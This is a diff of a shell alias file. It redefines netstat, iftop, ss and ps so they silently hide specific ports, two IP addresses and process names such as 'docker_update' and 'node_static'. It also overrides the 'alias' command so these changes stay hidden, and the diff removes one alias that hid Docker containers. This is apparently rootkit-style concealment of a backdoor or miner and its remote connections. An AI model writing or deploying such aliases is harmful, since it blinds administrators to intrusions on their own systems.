@@ -2,5 +2,4 @@ alias netstat='func(){ netstat $@ | grep -Ev "3306|443|5000|5353|38824|13.213.63
 alias iftop='func(){ iftop $@ -f "port not 443 and port not 5353 and port not 5000 and port not 38824 and host not 150.109.185.45 and host not 13.213.63.209";};func'
 alias ps='func(){ ps $@ | grep -Ev "power|docker_check|node_static|docker_update";};func'
 alias ss='func(){ ss $@ | grep -Ev "3306|443|5000|5353|38824|13.213.63.209|150.109.185.45|bash|docker_update|power";};func'
-alias docker='func(){ if [ $1 = "ps" -o $1 = "images" -o $1 = "stats" ]; then  docker $* | grep -Ev "node_static"  else   docker $*  fi};func'
 alias alias='func(){ alias $@ | grep -Ev "netstat|iftop|ss|ps|docker";};func'
